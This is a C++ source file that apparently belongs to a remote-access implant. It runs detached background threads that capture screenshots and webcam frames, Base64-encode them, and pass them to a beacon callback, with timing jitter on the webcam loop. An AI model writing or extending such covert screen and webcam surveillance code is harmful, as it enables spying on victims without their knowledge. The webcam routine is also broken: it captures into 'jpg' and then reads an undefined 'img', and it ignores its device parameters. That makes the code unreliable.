#include "Streamer.h"
#include "../capture/Screenshot.h"
#include "../capture/Webcam.h"
#include "../crypto/Base64.h"
#include <thread>
#include <atomic>
#include <chrono>
#include <mutex>

namespace streaming {

    namespace {
        std::atomic<bool> screenStreamActive{false};
        std::thread screenThread;
        std::mutex screenMutex;

        std::atomic<bool> webcamStreamActive{false};
        std::thread webcamThread;
        std::mutex webcamMutex;

        void ScreenWorker(int durationSec, std::string taskId, ResultCallback callback) {
            (void)taskId;
            auto startTime = std::chrono::steady_clock::now();
            int chunkId = 0;

            while (screenStreamActive) {
                if (durationSec > 0) {
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count();
                    if (elapsed >= durationSec) break;
                }

                std::vector<BYTE> jpg = capture::CaptureScreenshotJPEG();
                if (!jpg.empty()) {
                    std::string b64 = crypto::Base64Encode(jpg);
                    std::string output = "SCREEN_STREAM_CHUNK:" + b64;
                    // Task ID for chunks usually appended with counter in Python, but here we keep it simple or follow protocol
                    // Python: "screen_stream_chunk_{chunk_id}"
                    
                    callback("screen_stream_chunk_" + std::to_string(chunkId), output);
                    chunkId++;
                }

                // Reduce FPS to 1 to avoid overwhelming beacon loop and memory
                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
            }

            callback("screen_stream_end", "SCREEN_STREAM_END");
            screenStreamActive = false;
        }

        void WebcamWorker(int durationSec, std::string taskId, ResultCallback callback, int deviceIndex, std::string nameHint) {
            (void)taskId;
            auto startTime = std::chrono::steady_clock::now();
            int chunkId = 0;
            
            while (webcamStreamActive) {
                if (durationSec > 0) {
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count();
                    if (elapsed >= durationSec) break;
                }

        std::vector<BYTE> jpg = capture::CaptureWebcamImage();
                if (!img.empty()) {
                    std::string b64 = crypto::Base64Encode(img);
                    callback("webcam_stream_chunk_" + std::to_string(chunkId), "WEBCAM_STREAM_CHUNK:" + b64);
                    chunkId++;
                }

                int jitter = rand() % 200 + 300;
                std::this_thread::sleep_for(std::chrono::milliseconds(jitter));
            }

            callback("webcam_stream_end", "WEBCAM_STREAM_END");
            webcamStreamActive = false;
        }
    }

    void StartScreenStream(int durationSec, const std::string& taskId, ResultCallback callback) {
        std::lock_guard<std::mutex> lock(screenMutex);
        if (screenStreamActive) return;
        screenStreamActive = true;
        screenThread = std::thread(ScreenWorker, durationSec, taskId, callback);
        screenThread.detach(); // Detach to let it run background
    }

    void StopScreenStream() {
        screenStreamActive = false;
        std::lock_guard<std::mutex> lock(screenMutex);
        // Worker will exit
    }

    void StartWebcamStream(int durationSec, const std::string& taskId, ResultCallback callback, int deviceIndex, const std::string& nameHint) {
        std::lock_guard<std::mutex> lock(webcamMutex);
        if (webcamStreamActive) return;
        webcamStreamActive = true;
        webcamThread = std::thread(WebcamWorker, durationSec, taskId, callback, deviceIndex, nameHint);
        webcamThread.detach();
    }

    void StopWebcamStream() {
        webcamStreamActive = false;
        std::lock_guard<std::mutex> lock(webcamMutex);
    }

}
